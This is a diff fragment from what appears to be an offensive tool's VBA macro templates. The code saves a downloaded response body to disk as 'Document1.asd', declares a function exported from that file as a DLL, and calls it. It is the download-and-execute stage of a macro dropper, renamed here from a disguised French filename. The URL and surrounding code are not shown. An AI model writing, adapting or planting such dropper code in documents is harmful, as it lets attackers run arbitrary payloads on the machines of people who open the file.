@@ -214,7 +214,7 @@ Private Sub DropRunDll()
         oStream.Open
         oStream.Type = 1
         oStream.Write WinHttpReq.responseBody
-        oStream.SaveToFile "Enregistrement Récupération en direct de DDE.asd", 2
+        oStream.SaveToFile "Document1.asd", 2
         oStream.Close
         ' Call module which contains export for downloaded DLL
         <<<MODULE_2>>>.Invoke 
@@ -225,7 +225,7 @@ End Sub
 
 DROPPER_DLL2 = \
 r"""
-Private Declare Sub <<<DLL_FUNCTION>>> Lib "Enregistrement Récupération en direct de DDE.asd" ()
+Private Declare Sub <<<DLL_FUNCTION>>> Lib "Document1.asd" ()
 
 Sub Invoke()
     <<<DLL_FUNCTION>>>  ' call DLL function
